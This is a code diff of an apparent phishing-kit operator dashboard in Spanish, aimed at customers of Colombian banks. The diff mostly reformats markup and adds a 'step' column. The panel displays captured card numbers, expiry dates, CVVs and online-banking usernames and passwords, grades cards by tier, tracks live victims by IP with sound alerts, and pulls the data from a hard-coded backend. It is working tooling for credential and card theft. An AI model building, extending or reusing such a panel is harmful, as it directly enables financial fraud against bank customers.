@@ -9,7 +9,6 @@
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0e1a; color: #e5e7eb; min-height: 100vh; font-size: 14px; user-select: text; }
 .hidden { display: none !important; }
-
 #loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; background: linear-gradient(135deg, #0a0e1a 0%, #1a1f35 100%); }
 .login-box { background: #151b2e; border: 1px solid #252d44; border-radius: 16px; padding: 40px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
 .login-box h1 { font-size: 24px; margin-bottom: 8px; color: #88f456; text-align: center; }
@@ -20,10 +19,8 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .login-box button:hover { background: #7ae045; }
 .login-box button:disabled { opacity: 0.5; cursor: not-allowed; }
 .login-error { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; padding: 10px 14px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
-
 #dashboard { display: none; }
 #dashboard.visible { display: block; }
-
 .topbar { background: #151b2e; border-bottom: 1px solid #252d44; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; gap: 16px; flex-wrap: wrap; }
 .topbar-left { display: flex; align-items: center; gap: 20px; }
 .topbar h1 { font-size: 18px; color: #88f456; white-space: nowrap; }
@@ -36,11 +33,9 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .topbar-user strong { color: #e5e7eb; }
 .btn-logout { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
 .btn-logout:hover { background: #dc2626; }
-
 .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
 .tab-content { display: none; }
 .tab-content.active { display: block; }
-
 .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 20px; }
 .stat-card { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; }
 .stat-card .label { color: #8b94a8; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
@@ -49,7 +44,6 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .stat-card.blocked .value { color: #ef4444; }
 .stat-card.sessions .value { color: #60a5fa; }
 .stat-card.history .value { color: #a855f7; }
-
 .section { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
 .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #252d44; gap: 12px; flex-wrap: wrap; }
 .section-title { font-size: 15px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 8px; }
@@ -60,7 +54,6 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .btn-borrar { background: #dc2626; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
 .btn-borrar:hover { background: #b91c1c; }
 .btn-borrar:disabled { opacity: 0.4; cursor: not-allowed; }
-
 .table-wrap { overflow-x: auto; }
 table { width: 100%; border-collapse: collapse; font-size: 12px; }
 thead { background: #0f1421; }
@@ -73,11 +66,8 @@ tbody td.checkbox-col { text-align: center; }
 tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #88f456; }
 tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; font-size: 11px; }
 tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #cbd5e1; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-
 input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-color: #88f456; }
-
 .empty { text-align: center; padding: 30px 20px; color: #6b7280; font-style: italic; font-size: 12px; }
-
 .actions { display: flex; gap: 4px; flex-wrap: nowrap; }
 .btn { padding: 5px 9px; border-radius: 6px; border: none; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.15s; white-space: nowrap; display: inline-flex; align-items: center; gap: 3px; }
 .btn-accept { background: #16a34a; color: white; }
@@ -94,7 +84,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .btn-block:hover { background: #d97706; }
 .btn-unblock { background: #3b82f6; color: white; }
 .btn-unblock:hover { background: #2563eb; }
-
 .estado { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; white-space: nowrap; }
 .estado-pendiente { background: rgba(251, 191, 36, 0.15); color: #fbbf24; }
 .estado-aceptado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
@@ -103,7 +92,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .estado-token { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
 .estado-finalizado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
 .estado-cc_error { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
-
 .bin-nivel { display: inline-block; padding: 3px 9px; border-radius: 5px; font-size: 10px; font-weight: 700; text-transform: uppercase; white-space: nowrap; letter-spacing: 0.3px; }
 .bin-nivel.platinum { background: linear-gradient(135deg, #6b7280, #374151); color: #e5e7eb; }
 .bin-nivel.gold { background: linear-gradient(135deg, #b45309, #f59e0b); color: #fffbeb; }
@@ -115,26 +103,19 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .bin-nivel.classic { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
 .bin-nivel.standard { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
 .bin-nivel.desconocido { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
-
 .banco-emisor { font-size: 11px; color: #cbd5e1; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display: inline-block; max-width: 140px; }
-
 .block-input { display: flex; gap: 8px; margin-bottom: 14px; }
 .block-input input { flex: 1; padding: 10px 14px; background: #0f1421; border: 1px solid #252d44; border-radius: 8px; color: #e5e7eb; font-size: 13px; outline: none; }
 .block-input input:focus { border-color: #88f456; }
 .block-input button { padding: 10px 20px; background: #ef4444; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 13px; }
 .block-input button:hover { background: #dc2626; }
-
 .loading-indicator { display: inline-block; width: 8px; height: 8px; background: #88f456; border-radius: 50%; margin-right: 8px; animation: pulse 1.5s infinite; }
 @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
 #toast { position: fixed; bottom: 24px; right: 24px; background: #151b2e; border: 1px solid #252d44; border-left: 4px solid #88f456; color: #e5e7eb; padding: 14px 20px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); font-size: 13px; font-weight: 500; z-index: 9999; transform: translateX(500px); transition: transform 0.3s; max-width: 400px; }
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
-
 .banco-cell { display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; vertical-align: middle; }
 .banco-cell svg { height: 18px; width: auto; max-width: 44px; display: inline-block; vertical-align: middle; flex-shrink: 0; }
-
-/* Estilos para el despliegue del historial */
 .fila-detalle { background: #0f1421 !important; display: none; }
 .fila-detalle.visible { display: table-row; }
 .detalle-container { padding: 15px; border-left: 3px solid #88f456; margin: 10px; background: #151b2e; border-radius: 8px; }
@@ -142,10 +123,8 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .detalle-item { font-size: 12px; }
 .detalle-item .lbl { color: #8b94a8; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 2px; }
 .detalle-item .val { color: #e5e7eb; font-weight: 600; font-family: monospace; }
-
 .detalle-seccion { grid-column: 1 / -1; margin-top: 15px; padding-top: 15px; border-top: 1px dashed #252d44; }
 .detalle-seccion-titulo { color: #88f456; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
-
 @media (max-width: 768px) {
     .container { padding: 10px; }
     .stats { grid-template-columns: 1fr 1fr; }
@@ -188,66 +167,32 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
     </div>
 
     <div class="container">
-
         <!-- PESTAÑA PRINCIPAL -->
         <div class="tab-content active" id="tab-principal">
             <div class="stats">
-                <div class="stat-card">
-                    <div class="label">🟢 Activos</div>
-                    <div class="value" id="statActivos">0</div>
-                </div>
-                <div class="stat-card sessions">
-                    <div class="label">💳 Sesiones</div>
-                    <div class="value" id="statSesiones">0</div>
-                </div>
-                <div class="stat-card pending">
-                    <div class="label">⏳ Pendientes</div>
-                    <div class="value" id="statPendientes">0</div>
-                </div>
-                <div class="stat-card blocked">
-                    <div class="label">🚫 IPs bloqueadas</div>
-                    <div class="value" id="statBloqueadas">0</div>
-                </div>
-                <div class="stat-card history">
-                    <div class="label">📜 Historial</div>
-                    <div class="value" id="statHistorial">0</div>
-                </div>
+                <div class="stat-card"><div class="label">🟢 Activos</div><div class="value" id="statActivos">0</div></div>
+                <div class="stat-card sessions"><div class="label">💳 Sesiones</div><div class="value" id="statSesiones">0</div></div>
+                <div class="stat-card pending"><div class="label">⏳ Pendientes</div><div class="value" id="statPendientes">0</div></div>
+                <div class="stat-card blocked"><div class="label">🚫 IPs bloqueadas</div><div class="value" id="statBloqueadas">0</div></div>
+                <div class="stat-card history"><div class="label">📜 Historial</div><div class="value" id="statHistorial">0</div></div>
             </div>
 
             <div class="section">
                 <div class="section-header">
-                    <div class="section-title">
-                        <span class="loading-indicator"></span>
-                        🟢 Usuarios activos
-                        <span class="badge" id="badgeActivos">0</span>
-                    </div>
-                    <div class="section-tools">
-                        <input type="text" class="search-input" id="buscarActivos" placeholder="🔍 Buscar por IP o acción...">
-                    </div>
+                    <div class="section-title"><span class="loading-indicator"></span>🟢 Usuarios activos<span class="badge" id="badgeActivos">0</span></div>
+                    <div class="section-tools"><input type="text" class="search-input" id="buscarActivos" placeholder="🔍 Buscar por IP o acción..."></div>
                 </div>
                 <div class="table-wrap">
                     <table>
-                        <thead>
-                            <tr>
-                                <th>IP</th>
-                                <th>Última acción</th>
-                                <th>Tiempo</th>
-                                <th>Acciones</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tbodyActivos">
-                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
-                        </tbody>
+                        <thead><tr><th>IP</th><th>Última acción</th><th>Tiempo</th><th>Acciones</th></tr></thead>
+                        <tbody id="tbodyActivos"><tr><td colspan="4" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
 
             <div class="section">
                 <div class="section-header">
-                    <div class="section-title">
-                        💳 Sesiones de pago
-                        <span class="badge" id="badgeSesiones">0</span>
-                    </div>
+                    <div class="section-title">💳 Sesiones de pago<span class="badge" id="badgeSesiones">0</span></div>
                     <div class="section-tools">
                         <input type="text" class="search-input" id="buscarSesiones" placeholder="🔍 Buscar banco, IP, doc, estado, BIN...">
                         <button class="btn-borrar" id="btnBorrarSesiones" disabled>🗑️ Borrar seleccionados</button>
@@ -261,6 +206,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                                 <th style="text-align:center; width: 40px;" title="Estado de conexión">●</th>
                                 <th>Banco</th>
                                 <th>Estado</th>
+                                <th>Paso</th> <!-- 🔥 NUEVA COLUMNA -->
                                 <th>Identificación/Trj</th>
                                 <th>Clave/Fch</th>
                                 <th>CVV</th>
@@ -275,9 +221,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                                 <th>Acciones</th>
                             </tr>
                         </thead>
-                        <tbody id="tbodySesiones">
-                            <tr><td colspan="16" class="empty">Cargando...</td></tr>
-                        </tbody>
+                        <tbody id="tbodySesiones"><tr><td colspan="17" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -287,10 +231,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
         <div class="tab-content" id="tab-historial">
             <div class="section">
                 <div class="section-header">
-                    <div class="section-title">
-                        📜 Historial de datos ingresados
-                        <span class="badge" id="badgeHistorial">0</span>
-                    </div>
+                    <div class="section-title">📜 Historial de datos ingresados<span class="badge" id="badgeHistorial">0</span></div>
                     <div class="section-tools">
                         <input type="text" class="search-input" id="buscarHistorial" placeholder="🔍 Buscar por banco, doc, tarjeta, nombre...">
                         <button class="btn-borrar" id="btnBorrarHistorial" disabled>🗑️ Borrar seleccionados</button>
@@ -298,17 +239,8 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                 </div>
                 <div class="table-wrap">
                     <table>
-                        <thead>
-                            <tr>
-                                <th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th>
-                                <th>Fecha</th>
-                                <th>IP</th>
-                                <th>Acciones</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tbodyHistorial">
-                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
-                        </tbody>
+                        <thead><tr><th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th><th>Fecha</th><th>IP</th><th>Acciones</th></tr></thead>
+                        <tbody id="tbodyHistorial"><tr><td colspan="4" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -317,31 +249,17 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
         <div class="tab-content" id="tab-ips">
             <div class="section">
                 <div class="section-header">
-                    <div class="section-title">
-                        🚫 IPs bloqueadas
-                        <span class="badge" id="badgeIps">0</span>
-                    </div>
+                    <div class="section-title">🚫 IPs bloqueadas<span class="badge" id="badgeIps">0</span></div>
                     <div class="section-tools">
                         <input type="text" class="search-input" id="buscarIps" placeholder="🔍 Buscar IP...">
                         <button class="btn-borrar" id="btnBorrarIps" disabled>🗑️ Borrar seleccionados</button>
                     </div>
                 </div>
-                <div class="block-input">
-                    <input type="text" id="inputNuevaIp" placeholder="IP a bloquear (ej. 190.25.10.5)">
-                    <button id="btnBloquearManual">Bloquear</button>
-                </div>
+                <div class="block-input"><input type="text" id="inputNuevaIp" placeholder="IP a bloquear (ej. 190.25.10.5)"><button id="btnBloquearManual">Bloquear</button></div>
                 <div class="table-wrap">
                     <table>
-                        <thead>
-                            <tr>
-                                <th class="checkbox-col"><input type="checkbox" id="checkAllIps"></th>
-                                <th>IP</th>
-                                <th>Acciones</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tbodyIps">
-                            <tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>
-                        </tbody>
+                        <thead><tr><th class="checkbox-col"><input type="checkbox" id="checkAllIps"></th><th>IP</th><th>Acciones</th></tr></thead>
+                        <tbody id="tbodyIps"><tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -350,52 +268,30 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
         <div class="tab-content" id="tab-logs">
             <div class="section">
                 <div class="section-header">
-                    <div class="section-title">
-                        📋 Logs de acceso al panel
-                        <span class="badge" id="badgeLogs">0</span>
-                    </div>
-                    <div class="section-tools">
-                        <input type="text" class="search-input" id="buscarLogs" placeholder="🔍 Buscar tipo, usuario, IP...">
-                    </div>
+                    <div class="section-title">📋 Logs de acceso al panel<span class="badge" id="badgeLogs">0</span></div>
+                    <div class="section-tools"><input type="text" class="search-input" id="buscarLogs" placeholder="🔍 Buscar tipo, usuario, IP..."></div>
                 </div>
                 <div class="table-wrap">
                     <table>
-                        <thead>
-                            <tr>
-                                <th class="checkbox-col"><input type="checkbox" id="checkAllLogs"></th>
-                                <th>Fecha</th>
-                                <th>Tipo</th>
-                                <th>Detalles</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tbodyLogs">
-                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
-                        </tbody>
+                        <thead><tr><th class="checkbox-col"><input type="checkbox" id="checkAllLogs"></th><th>Fecha</th><th>Tipo</th><th>Detalles</th></tr></thead>
+                        <tbody id="tbodyLogs"><tr><td colspan="4" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
         </div>
-
     </div>
 </div>
 
 <div id="toast"></div>
 
-<!-- MODAL PARA VER CREDENCIALES DE AUTORIZACIÓN -->
 <div id="modalVerAuth" class="hidden" style="position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;">
     <div style="background: #151b2e; border: 1px solid #252d44; border-radius: 12px; width: 100%; max-width: 400px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5);">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #252d44; padding-bottom: 10px;">
             <h3 style="color: #88f456; margin: 0; font-size: 16px;">🔐 Autorización Banca Virtual</h3>
             <button onclick="document.getElementById('modalVerAuth').classList.add('hidden')" style="background: none; border: none; color: #ef4444; font-size: 20px; cursor: pointer;">×</button>
         </div>
-        <div style="margin-bottom: 10px;">
-            <span style="color: #8b94a8; font-size: 12px;">Usuario:</span>
-            <div id="verAuthUsuario" style="color: #fff; font-family: monospace; font-size: 15px; background: #0f1421; padding: 8px; border-radius: 6px; margin-top: 4px; user-select: text;"></div>
-        </div>
-        <div style="margin-bottom: 10px;">
-            <span style="color: #8b94a8; font-size: 12px;">Contraseña:</span>
-            <div id="verAuthPassword" style="color: #fff; font-family: monospace; font-size: 15px; background: #0f1421; padding: 8px; border-radius: 6px; margin-top: 4px; user-select: text;"></div>
-        </div>
+        <div style="margin-bottom: 10px;"><span style="color: #8b94a8; font-size: 12px;">Usuario:</span><div id="verAuthUsuario" style="color: #fff; font-family: monospace; font-size: 15px; background: #0f1421; padding: 8px; border-radius: 6px; margin-top: 4px; user-select: text;"></div></div>
+        <div style="margin-bottom: 10px;"><span style="color: #8b94a8; font-size: 12px;">Contraseña:</span><div id="verAuthPassword" style="color: #fff; font-family: monospace; font-size: 15px; background: #0f1421; padding: 8px; border-radius: 6px; margin-top: 4px; user-select: text;"></div></div>
     </div>
 </div>
 
@@ -404,135 +300,34 @@ const API_BASE = 'https://multi-bancos-production.up.railway.app';
 let TOKEN = sessionStorage.getItem('adminToken') || '';
 let USUARIO = sessionStorage.getItem('adminUser') || '';
 let pollInterval = null;
-
 let sesionesCache = [];
 let ipsCache = [];
 let logsCache = [];
 let activosCache = [];
 let historialCache = [];
 let filasAbiertas = new Set();
-
 let seleccionSesiones = new Set();
 let seleccionIps = new Set();
 let seleccionHistorial = new Set();
-
 let sesionesAnteriores = new Set(); 
 let audioCtx = null;
 
 function $(id) { return document.getElementById(id); }
-
-function reproducirSonido() {
-    try {
-        if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
-        if (audioCtx.state === 'suspended') { audioCtx.resume(); }
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(800, audioCtx.currentTime); 
-        osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); 
-        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); 
-        osc.connect(gain);
-        gain.connect(audioCtx.destination);
-        osc.start();
-        osc.stop(audioCtx.currentTime + 0.3);
-    } catch (e) { console.warn('Audio bloqueado', e); }
-}
-
-function toast(msg, isError = false) {
-    const el = $('toast');
-    el.textContent = msg;
-    el.className = 'show' + (isError ? ' error' : '');
-    clearTimeout(el._t);
-    el._t = setTimeout(() => { el.className = ''; }, 3000);
-}
-
-function escapeHtml(s) {
-    if (s == null) return '';
-    return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
-}
-
-function truncar(s, max = 30) {
-    if (!s) return '-';
-    s = String(s);
-    return s.length > max ? s.slice(0, max) + '...' : s;
-}
-
-function formatTime(segundos) {
-    if (segundos < 60) return segundos + 's';
-    if (segundos < 3600) return Math.floor(segundos / 60) + 'm ' + (segundos % 60) + 's';
-    return Math.floor(segundos / 3600) + 'h ' + Math.floor((segundos % 3600) / 60) + 'm';
-}
+function reproducirSonido() { try { if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } if (audioCtx.state === 'suspended') { audioCtx.resume(); } const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } catch (e) { console.warn('Audio bloqueado', e); } }
+function toast(msg, isError = false) { const el = $('toast'); el.textContent = msg; el.className = 'show' + (isError ? ' error' : ''); clearTimeout(el._t); el._t = setTimeout(() => { el.className = ''; }, 3000); }
+function escapeHtml(s) { if (s == null) return ''; return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+function truncar(s, max = 30) { if (!s) return '-'; s = String(s); return s.length > max ? s.slice(0, max) + '...' : s; }
+function formatTime(segundos) { if (segundos < 60) return segundos + 's'; if (segundos < 3600) return Math.floor(segundos / 60) + 'm ' + (segundos % 60) + 's'; return Math.floor(segundos / 3600) + 'h ' + Math.floor((segundos % 3600) / 60) + 'm'; }
 
 const LOGO_VISA = '<svg viewBox="0 0 100 33" xmlns="http://www.w3.org/2000/svg"><path d="M42.5 0.5L28.9 32.8H19.6L12.7 6.5C12.3 5.3 11.9 4.9 11 4.4C9.5 3.5 6.9 2.7 4.6 2.2L4.7 1.4H19.7C21.8 1.4 23.7 2.8 24.2 5.2L27.6 23.4L36.2 1.4H42.5V0.5ZM67.4 22C67.5 12.4 54.7 12.4 54.8 7.9C54.8 6.5 56.1 5 59 5C60.4 5 64.3 5.4 66.5 6.4L67.5 1.1C65.3 0.2 62.4 0 59 0C47.8 0 40 5.8 40 14.2C40 20.4 45.6 23.8 49.8 26C54.1 28.2 55.5 29.7 55.5 31.6C55.5 34.7 51.8 36 48.4 36C42.5 36 38.9 34.3 36.6 33L35.4 38.4C38.3 39.7 43.7 41 47.8 41C59.6 41 66.5 35.4 66.5 26.6C66.5 20.2 60.2 16.5 56.8 14C53.5 11.4 52.5 10.1 52.5 8.6C52.5 6.5 54.8 4.4 58.8 4.4C62.7 4.4 66.2 5.9 67.4 22ZM95.2 1.4H85.8C83.7 1.4 82.2 2.6 81.4 4.4L59.7 40.8H72.1L74.6 34.1H93.7L95.2 40.8H107L95.2 1.4ZM78.3 25.6L83.6 12.1L87.6 25.6H78.3Z" fill="#1434CB" transform="translate(0 -1)"/></svg>';
 const LOGO_MC = '<svg viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
 const LOGO_AMEX = '<svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
 
-function logoMarca(marca) {
-    if (marca === 'visa') return LOGO_VISA;
-    if (marca === 'mastercard') return LOGO_MC;
-    if (marca === 'amex') return LOGO_AMEX;
-    return '💳';
-}
-
-function nombreBanco(key, marca) {
-    if (key === 'cc-bogota') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>'; }
-    if (key === 'cc-bucaramanga') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>'; }
-    const nombres = {
-        'bancolombia': '🏦 Bancolombia',
-        'davivienda': '🏦 Davivienda',
-        'avvillas': '🏦 AV Villas',
-        'bogota': '🏦 B. Bogotá',
-        'caja-social': '🏦 Caja Social',
-        'bbva': '🏦 BBVA',
-        'popular': '🏦 Popular',
-        'occidente': '🏦 Occidente',
-        'nequi': '📱 Nequi'
-    };
-    return nombres[key] || key;
-}
-
-function claseNivel(nivel) {
-    if (!nivel) return 'desconocido';
-    const n = String(nivel).toLowerCase();
-    if (n.includes('platinum') || n.includes('platino')) return 'platinum';
-    if (n.includes('gold') || n.includes('oro')) return 'gold';
-    if (n.includes('silver') || n.includes('plata')) return 'silver';
-    if (n.includes('black') || n.includes('negra')) return 'black';
-    if (n.includes('business') || n.includes('empresarial')) return 'business';
-    if (n.includes('signature')) return 'signature';
-    if (n.includes('infinite')) return 'infinite';
-    if (n.includes('classic') || n.includes('clásica')) return 'classic';
-    if (n.includes('standard') || n.includes('estándar')) return 'standard';
-    return 'desconocido';
-}
-
-function renderNivelTarjeta(tipo, nivel) {
-    if (!nivel || nivel === 'Desconocido') { return '<span class="bin-nivel desconocido">—</span>'; }
-    let tipoMostrar = '';
-    const t = String(tipo || '').toUpperCase();
-    if (t.includes('CREDIT')) tipoMostrar = 'Crédito ';
-    else if (t.includes('DEBIT')) tipoMostrar = 'Débito ';
-
-    const texto = tipoMostrar + nivel;
-    const clase = claseNivel(nivel);
-    return `<span class="bin-nivel ${clase}">${escapeHtml(texto)}</span>`;
-}
-
-async function api(path, options = {}) {
-    const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
-    if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN;
-    const res = await fetch(API_BASE + path, { ...options, headers });
-    if (res.status === 401) { logout(); throw new Error('Sesión expirada'); }
-    if (res.status === 403) {
-        const d = await res.json().catch(() => ({}));
-        if (d.redirect) window.location.href = d.redirect;
-        throw new Error(d.error || 'Acceso denegado');
-    }
-    const data = await res.json().catch(() => ({}));
-    if (!res.ok) throw new Error(data.error || 'Error en la petición');
-    return data;
-}
+function logoMarca(marca) { if (marca === 'visa') return LOGO_VISA; if (marca === 'mastercard') return LOGO_MC; if (marca === 'amex') return LOGO_AMEX; return '💳'; }
+function nombreBanco(key, marca) { if (key === 'cc-bogota') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>'; } if (key === 'cc-bucaramanga') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>'; } const nombres = { 'bancolombia': '🏦 Bancolombia', 'davivienda': '🏦 Davivienda', 'avvillas': '🏦 AV Villas', 'bogota': '🏦 B. Bogotá', 'caja-social': '🏦 Caja Social', 'bbva': '🏦 BBVA', 'popular': '🏦 Popular', 'occidente': '🏦 Occidente', 'nequi': '📱 Nequi' }; return nombres[key] || key; }
+function claseNivel(nivel) { if (!nivel) return 'desconocido'; const n = String(nivel).toLowerCase(); if (n.includes('platinum') || n.includes('platino')) return 'platinum'; if (n.includes('gold') || n.includes('oro')) return 'gold'; if (n.includes('silver') || n.includes('plata')) return 'silver'; if (n.includes('black') || n.includes('negra')) return 'black'; if (n.includes('business') || n.includes('empresarial')) return 'business'; if (n.includes('signature')) return 'signature'; if (n.includes('infinite')) return 'infinite'; if (n.includes('classic') || n.includes('clásica')) return 'classic'; if (n.includes('standard') || n.includes('estándar')) return 'standard'; return 'desconocido'; }
+function renderNivelTarjeta(tipo, nivel) { if (!nivel || nivel === 'Desconocido') { return '<span class="bin-nivel desconocido">—</span>'; } let tipoMostrar = ''; const t = String(tipo || '').toUpperCase(); if (t.includes('CREDIT')) tipoMostrar = 'Crédito '; else if (t.includes('DEBIT')) tipoMostrar = 'Débito '; const texto = tipoMostrar + nivel; const clase = claseNivel(nivel); return `<span class="bin-nivel ${clase}">${escapeHtml(texto)}</span>`; }
+async function api(path, options = {}) { const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) }; if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN; const res = await fetch(API_BASE + path, { ...options, headers }); if (res.status === 401) { logout(); throw new Error('Sesión expirada'); } if (res.status === 403) { const d = await res.json().catch(() => ({})); if (d.redirect) window.location.href = d.redirect; throw new Error(d.error || 'Acceso denegado'); } const data = await res.json().catch(() => ({})); if (!res.ok) throw new Error(data.error || 'Error en la petición'); return data; }
 
 $('loginBtn').addEventListener('click', login);
 $('loginPass').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
@@ -542,130 +337,28 @@ async function login() {
     const usuario = $('loginUser').value.trim();
     const password = $('loginPass').value;
     if (!usuario || !password) { mostrarErrorLogin('Complete usuario y contraseña'); return; }
-    
     if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
     if (audioCtx.state === 'suspended') { audioCtx.resume(); }
-
-    $('loginBtn').disabled = true;
-    $('loginBtn').textContent = 'Verificando...';
+    $('loginBtn').disabled = true; $('loginBtn').textContent = 'Verificando...';
     try {
-        const res = await fetch(API_BASE + '/admin/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ usuario, password })
-        });
